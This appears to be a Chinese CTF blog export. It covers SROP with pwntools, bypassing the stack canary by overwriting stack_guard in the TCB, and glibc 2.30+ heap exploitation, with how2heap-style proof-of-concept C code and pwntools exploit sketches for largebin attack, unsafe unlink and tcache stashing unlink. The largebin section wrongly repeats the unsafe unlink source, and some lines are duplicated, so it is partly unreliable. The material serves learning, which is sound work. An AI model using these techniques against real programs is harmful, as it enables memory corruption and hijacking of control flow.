class=\"line\">  <span class=\"type\">__uint16_t</span>        swd;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        ftw;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        fop;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span>        rip;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span>        rdp;</span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        mxcsr;</span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        mxcr_mask;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpxreg</span>    _<span class=\"title\">st</span>[8];</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">xmmreg</span>    _<span class=\"title\">xmm</span>[16];</span></span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        padding[<span class=\"number\">24</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigcontext</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r8;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r9;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r10;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r11;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r12;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r13;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r14;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r15;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rdi;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rsi;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rbp;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rbx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rdx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rax;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rcx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rsp;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rip;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> eflags;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> cs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> gs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> fs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> __pad0;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> err;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> trapno;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> oldmask;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> cr2;</span><br><span class=\"line\">  __extension__ <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span> * <span class=\"title\">fpstate</span>;</span></span><br><span class=\"line\">      <span class=\"type\">__uint64_t</span> __fpstate_word;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> __reserved1 [<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h5 id=\"pwntools-srop\">pwntools.srop</h5>\n<p>pwntools集成了SROP的模块，可以帮助制作fake_frame:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 一个简单的例子</span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure>\n<h4 id=\"stack-gaurd\">stack_gaurd</h4>\n<p>我们都知道canary来自<code>fs:0x28</code>， <code>fs</code> 实际上指向的是<a href=\"http://www.openwall.com/lists/oss-security/2018/02/27/5\">TCB</a> ， TCB结构如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *tcb;                <span class=\"comment\">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class=\"line\"><span class=\"comment\">                           thread descriptor used by libpthread.  */</span></span><br><span class=\"line\">  <span class=\"type\">dtv_t</span> *dtv;</span><br><span class=\"line\">  <span class=\"type\">void</span> *self;                <span class=\"comment\">/* Pointer to the thread descriptor.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> multiple_threads;</span><br><span class=\"line\">  <span class=\"type\">int</span> gscope_flag;  <span class=\"comment\">// not in 32bit</span></span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> sysinfo;</span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> stack_guard;</span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> pointer_guard;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span> vgetcpu_cache[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class=\"line\"><span class=\"comment\">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> feature_1;</span><br><span class=\"line\">  <span class=\"type\">int</span> __glibc_unused1;</span><br><span class=\"line\">  <span class=\"comment\">/* Reservation of some values for the TM ABI.  */</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *__private_tm[<span class=\"number\">4</span>];</span><br><span class=\"line\">  <span class=\"comment\">/* GCC split stack support.  */</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *__private_ss;</span><br><span class=\"line\">  <span class=\"comment\">/* The lowest address of shadow stack,  */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span> ssp_base;</span><br><span class=\"line\">  <span class=\"comment\">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class=\"line\"><span class=\"comment\">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class=\"line\">  __128bits __glibc_unused2[<span class=\"number\">8</span>][<span class=\"number\">4</span>] __attribute__ ((aligned (<span class=\"number\">32</span>)));</span><br><span class=\"line\">  <span class=\"type\">void</span> *__padding[<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125; <span class=\"type\">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>\n<p>0x28的偏移实际上是指向的stack_guard</p>\n<p>那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择<code>pthread_self()</code> 来查看<code>fs</code>的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">pthread_t</span></span><br><span class=\"line\"><span class=\"title function_\">pthread_self</span> <span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">pthread_t</span>) THREAD_SELF;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在gdb中查看这个地址，发现这个地址实际上在libc的附近。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p/x (tcbhead_t)*(tcbhead_t *)(pthread_self())</span><br><span class=\"line\">p/x (void*)(pthread_self())</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">             Start                End Perm     Size Offset File</span><br><span class=\"line\">    0x555555554000     0x555555555000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x555555556000     0x555555557000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x555555557000     0x555555558000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class=\"line\">    0x7ffff7dc7000     0x7ffff7dc9000 rw-p     2000      0 [anon_7ffff7dc7]</span><br><span class=\"line\">    0x7ffff7dc9000     0x7ffff7def000 r--p    26000      0 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7def000     0x7ffff7f4c000 r-xp   15d000  26000 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7f4c000     0x7ffff7f99000 r--p    4d000 183000 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 1d0000 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 1d4000 /usr/lib64/libc.so.6</span><br><span class=\"line\">    0x7ffff7f9f000     0x7ffff7fa9000 rw-p     a000      0 [anon_7ffff7f9f]</span><br><span class=\"line\">    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]</span><br><span class=\"line\">    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]</span><br><span class=\"line\">    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class=\"line\">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">p/x (void*)(pthread_self())</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">16 = 0x7ffff7fa8680</span></span><br></pre></td></tr></table></figure>\n<p>如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。</p>\n<p>但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程<code>fs</code> 寄存器地址的，所以可以通过此来实现覆盖。</p>\n"},{"title":"heap-exploation-up-to-2.31","date":"2023-06-20T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n# Basic Knowledge\n\n\n###### bins:\n\n| unsorted bin  | fast bin  | small bin | large bin |\n| ------------- | --------- | --------- | --------- |\n| NO LIMITATION | 0x20-0x80 | <0x400    | >0x400    |\n\n## libc version\nubuntu-libc version\n- 2.23=\"16.04\"  \n- 2.24=\"17.04\" \n- 2.26=\"17.10\"\n- 2.27=\"18.04\"  \n- 2.28=\"18.10\" \n- 2.29=\"19.04\"\n- 2.30=\"19.10\" \n- 2.31=\"20.04\"\n- 2.32=\"20.10\"\n- 2.33=\"21.04\"\n- 2.34=\"22.04\"\n\n# Overview\n在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。\n\n本文主要**针对glibc2.30及以上**有着tcache的版本。~~因为低于2.27版本的堆笔者根本不会~~\n\n正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。\n\n在笔者看来，一次堆利用主要分为一下几个步骤：\n- 漏洞的发现\n- 地址的泄露\n- 利用漏洞控制目标地址内容\n- 攻击的对象\n\n因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。\n\n笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节--去看这些技巧的提出者大师傅可能讲述地要比我更完善--而着重于贯穿各个技巧的联系， ~~才不是因为笔者懒呢~~ ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。\n\n# 基本漏洞\n**UAF**\n在free时没有清空指针，可以重利用指针。\n在没有`Edit` 的情况下，可以通过 `double free` 进行堆块重叠。\n\n**overflow**\n溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用\n\n**off-by-one**/**off-by-null**\n这里主要针对2.29-2.31版本, [2.29-2.31版本的off-by-null](https://www.anquanke.com/post/id/236078#h3-4) ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。\n\n\n**漏洞的利用**\n上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流\n考虑:\n- one gadget \n- system(\"/bin/sh\") \n- orw \n\n\n# leak \n一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。\n\n一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。\n\n也可以释放入unsorted  bin 后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。\n\n而在没有show相关输出chunk内容的函数时，考虑通过`_IO_2_1_stdout_` 来leak \n基本原理就是partial overwrite 覆盖unsorted  bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak \n\n\n\n\n# Basic tricks up to 2.30\n在2.30以上的版本，我认为需要掌握的基本技术主要包括:\n- [x] largebin attack \n- [x] tcache stashing unlink attack \n- [x] unsafe unlink \n- [x] tcache poison\n- [x] house of botcake  \n- [x] decrypt safe_unlink \n- [x] house of pig \n- [x] 堆布局\n\n这里结合how to heap源代码分析\n\n## Largebin attack \n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <assert.h>\n\nuint64_t *chunk0_ptr;\n\nint main()\n{\n\tsetbuf(stdout, NULL);\n\tprintf(\"Welcome to unsafe unlink 2.0!\\n\");\n\tprintf(\"Tested in Ubuntu 20.04 64bit.\\n\");\n\tprintf(\"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\");\n\tprintf(\"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\");\n\n\tint malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin\n\tint header_size = 2;\n\n\tprintf(\"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\");\n\n\tchunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0\n\tuint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1\n\tprintf(\"The global chunk0_ptr is at %p, pointing to %p\\n\", &chunk0_ptr, chunk0_ptr);\n\tprintf(\"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr);\n\n\tprintf(\"We create a fake chunk inside chunk0.\\n\");\n\tprintf(\"We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n\");\n\tchunk0_ptr[1] = chunk0_ptr[-1] - 0x10;\n\tprintf(\"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\\n\");\n\tchunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);\n\tprintf(\"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\\n\");\n\tprintf(\"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\\n\");\n\tchunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);\n\tprintf(\"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]);\n\tprintf(\"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]);\n\n\tprintf(\"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\");\n\tuint64_t *chunk1_hdr = chunk1_ptr - header_size;\n\tprintf(\"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\");\n\tprintf(\"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\");\n\tchunk1_hdr[0] = malloc_size;\n\tprintf(\"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n\",(void*)chunk1_hdr[0]);\n\tprintf(\"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n\");\n\tchunk1_hdr[1] &= ~1;\n\n\tprintf(\"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\");\n\tprintf(\"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\");\n\tfree(chunk1_ptr);\n\n\tprintf(\"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\");\n\tchar victim_string[8];\n\tstrcpy(victim_string,\"Hello!~\");\n\tchunk0_ptr[3] = (uint64_t) victim_string;\n\n\tprintf(\"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\");\n\tprintf(\"Original value: %s\\n\",victim_string);\n\tchunk0_ptr[0] = 0x4141414142424242LL;\n\tprintf(\"New Value: %s\\n\",victim_string);\n\n\t// sanity check\n\tassert(*(long *)victim_string == 0x4141414142424242L);\n}\n```\n\n\n\n**核心思路:**\n```python\nmalloc(0x420) # chunk A\nmalloc(0x18)\n#And another chunk to prevent consolidate\nmalloc(0x410) # chunk B\n#This chunk should be smaller than [p1] and belong to the same large bin\nmalloc(0x18)\n#And another chunk to prevent consolidate\nfree(0)\nmalloc(0x438)\n#Allocate a chunk larger than [p1] to insert [p1] into large bin\nfree(1)\n#Free the smaller of the two --> [p2]\nedit(0, p64(0)*3+p64(target2-0x20))\n#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址\nmalloc(0x438)\nedit(0, p64(recover)*2) # 修复large bin attack \n```\n\n**修复:**\n可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算 \n\n**限制:**\n- 需要一次UAF \n\n**效果:**\n- 在2.30以上可以在任意地址写入一个libc地址\n\n## unsafe unlink \n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <assert.h>\n\nuint64_t *chunk0_ptr;\n\nint main()\n{\n\tsetbuf(stdout, NULL);\n\tprintf(\"Welcome to unsafe unlink 2.0!\\n\");\n\tprintf(\"Tested in Ubuntu 20.04 64bit.\\n\");\n\tprintf(\"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\");\n\tprintf(\"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\");\n\n\tint malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin\n\tint header_size = 2;\n\n\tprintf(\"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\");\n\n\tchunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0\n\tuint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1\n\tprintf(\"The global chunk0_ptr is at %p, pointing to %p\\n\", &chunk0_ptr, chunk0_ptr);\n\tprintf(\"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr);\n\n\tprintf(\"We create a fake chunk inside chunk0.\\n\");\n\tprintf(\"We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n\");\n\tchunk0_ptr[1] = chunk0_ptr[-1] - 0x10;\n\tprintf(\"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\\n\");\n\tchunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);\n\tprintf(\"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\\n\");\n\tprintf(\"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\\n\");\n\tchunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);\n\tprintf(\"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]);\n\tprintf(\"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]);\n\n\tprintf(\"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\");\n\tuint64_t *chunk1_hdr = chunk1_ptr - header_size;\n\tprintf(\"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\");\n\tprintf(\"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\");\n\tchunk1_hdr[0] = malloc_size;\n\tprintf(\"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n\",(void*)chunk1_hdr[0]);\n\tprintf(\"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n\");\n\tchunk1_hdr[1] &= ~1;\n\n\tprintf(\"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\");\n\tprintf(\"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\");\n\tfree(chunk1_ptr);\n\n\tprintf(\"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\");\n\tchar victim_string[8];\n\tstrcpy(victim_string,\"Hello!~\");\n\tchunk0_ptr[3] = (uint64_t) victim_string;\n\n\tprintf(\"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\");\n\tprintf(\"Original value: %s\\n\",victim_string);\n\tchunk0_ptr[0] = 0x4141414142424242LL;\n\tprintf(\"New Value: %s\\n\",victim_string);\n\n\t// sanity check\n\tassert(*(long *)victim_string == 0x4141414142424242L);\n}\n```\n\n**核心思路:**\n```python\n# chunk 0 ptr store in &ptr\n\nmalloc(0x420) # not in fastbin or tcache\nmalloc(0x420) \nedit(0, p64(0)+p64(fake_size)+p64(&ptr-0x18)+p64(&ptr-0x10)+p64(0)*k + p64(fake_prev_size)+p64(size)) # fakesize = 0x420-0x10\n# need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0\n```\n\n**限制:**\n- overflow ,可以修改prev_inuse触发fake chunk  unlink and  consolidate \n- 主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构\n\n**效果:**\n- 可以将ptr处地址改写为&ptr-8\n\n\n\n##  tcache stashing unlink \n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <assert.h>\n\nint main(){\n    unsigned long stack_var[0x10] = {0};\n    unsigned long *chunk_lis[0x10] = {0};\n    unsigned long *target;\n\n    setbuf(stdout, NULL);\n\n    printf(\"This file demonstrates the stashing unlink attack on tcache.\\n\\n\");\n    printf(\"This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\\n\\n\");\n    printf(\"This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\\n\\n\");\n    printf(\"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\\n\\n\");\n    printf(\"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\\n\\n\");\n\n    // stack_var emulate the fake_chunk we want to alloc to\n    printf(\"Stack_var emulates the fake chunk we want to alloc to.\\n\\n\");\n    printf(\"First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\\n\\n\");\n\n    stack_var[3] = (unsigned long)(&stack_var[2]);\n\n    printf(\"You can see the value of fake_chunk->bk is:%p\\n\\n\",(void*)stack_var[3]);\n    printf(\"Also, let's see the initial value of stack_var[4]:%p\\n\\n\",(void*)stack_var[4]);\n    printf(\"Now we alloc 9 chunks with malloc.\\n\\n\");\n\n    //now we malloc 9 chunks\n    for(int i = 0;i < 9;i++){\n        chunk_lis[i] = (unsigned long*)malloc(0x90);\n    }\n\n    //put 7 chunks into tcache\n    printf(\"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\\n\\n\");\n\n    for(int i = 3;i < 9;i++){\n        free(chunk_lis[i]);\n    }\n\n    printf(\"As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\\n\\n\");\n\n    //last tcache bin\n    free(chunk_lis[1]);\n    //now they are put into unsorted bin\n    free(chunk_lis[0]);\n    free(chunk_lis[2]);\n\n    //convert into small bin\n    printf(\"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\\n\\n\");\n\n    